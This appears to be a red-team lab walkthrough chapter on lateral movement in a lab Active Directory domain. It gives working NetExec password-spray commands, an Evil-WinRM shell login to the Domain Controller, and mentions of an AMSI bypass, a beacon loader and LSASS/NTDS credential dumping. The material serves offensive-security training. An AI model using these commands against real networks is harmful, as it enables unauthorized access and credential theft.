# 5 - Lateral Movement

# Password Spray & Weak Credential Exploitation

Password spraying is a low-noise, high-success technique that tests one password across many users, often exploiting common patterns and weak password policies.

## Usernames list
- Usernames were extracted based on Havoc's BOF `domainenum` and have been saved for convenience at:
```
/home/kali/password_spray/usernames.txt
```

![image](https://github.com/user-attachments/assets/deeff09c-1623-4639-9b0e-6dfb33bff1ee)


## Password Policy
Before performing any password spray, it's critical to understand the domain's account lockout policy. Spraying without this knowledge can trigger 
- Account lockouts
- User complaints
- Blue team alerts
- Immediate detection of your presence

The Havoc's BOF `dcenum`, which we already used on basic enumeration, can help us to check the Domain Password Policy:

![image](https://github.com/user-attachments/assets/f52a30cd-5351-4db4-8127-5154f088b5c3)


# Common Password Patterns
Many users follow predictable patterns when creating passwords. Some of the most abusable formats include:
- 📆 MonthYear → March2024
- 🌤 SeasonYear → Summer2025!
- 📅 DayDate → Tuesday23!
- 💀 Leetspeak → L@bl0cal, P@ssw0rd123, Adm1n!2024

These are often overlooked by defenders but easily guessed by attackers.

- A password list `passwords.txt` with weak/common credentials was previously created and located at:
```
/home/kali/password_spray/passwords.txt
```

## Netexec 1 - One Password for All Users
Run a password spray using NetExec:
```bash
cd ~/password_spray/
```
and then...
```
netexec smb 10.10.X.10 -u 'usernames.txt' -p 'L@bl0cal' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log one_for_all
```
> - Sweeps across the subnet using one weak password
> - Identifies any accounts that reused `L@bl0cal`
> - Ideal first strike — low risk of lockout

![image](https://github.com/user-attachments/assets/dc1f1de3-db2e-4ec0-a77a-8dec589ae5af)


## Netexec 2 - Matching username = password
Run a password spray using NetExec:
```bash
netexec smb 10.10.X.10 -u 'usernames.txt' -p 'usernames.txt' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log password_equal_username
```
> - Tests each user with their own username as password
> - Example: jdoe:jdoe, admin:admin
> - Simple, effective, and surprisingly successful in many orgs

![image](https://github.com/user-attachments/assets/4d53a9b8-561d-40ef-ad1e-d9efa8b0e0e2)


## Netexec 3 - Full Spray with Password List
```bash
netexec smb 10.10.X.10 -u 'usernames.txt' -p 'passwords.txt' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log pass_sweep
```
> - Tests each password in the list against every user
> - Be cautious of account lockout policies: `try to space attempts over time`

![image](https://github.com/user-attachments/assets/591afcfd-b95d-4e36-b7ea-76e538b39646)


Once done, you can confirm the results using `cat` and `grep` commands:
```bash
cat pass_sweep | grep Pwn3d!
```

![image](https://github.com/user-attachments/assets/07e8b1b2-0e0b-412d-aa21-d1e12f0aa8fe)

## Remote Shell via Evil-WinRM
For targets with `WinRM` enabled do:
```
evil-winrm -i 10.10.X.10 -u svc_exchange  -p 1q2w3e4r
```

Executing the command above, we gain shell access on the Domain Controller with a Full PowerShell session (high-integrity context).

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) we can do:
- File upload/download
- Script execution
- Live command interaction

![image](https://github.com/user-attachments/assets/0fccb518-c85f-47a9-997c-49f8324487a1)


Let's deploy an elevated Havoc beacon on the Domain Controller server:
1. Execute the AMSI bypass script line-by-line
2. Deploy our obfuscated `.ps1` loader

This gave us a new high-privileged Beacon on the most critical asset in the network.

> - With a fully elevated Beacon now running on the Domain Controller, we gain access to native post-exploitation modules within Havoc, including BOFs like `nanodump`.  
> - Nanodump is a Beacon Object File that functions similarly to Mimikatz: it dumps the LSASS memory safely and stealthily, allowing credential extraction without touching the disk.  
> - However, since we've already performed a full `NTDS.dit` hash dump using Impacket's `secretsdump.py`, dumping LSASS again would be redundant.  

Still, it's important to note that `nanodump` works reliably from an elevated Beacon, and in scenarios without cert access or full hash dumps, it would be a powerful alternative to extract credentials in-memory.



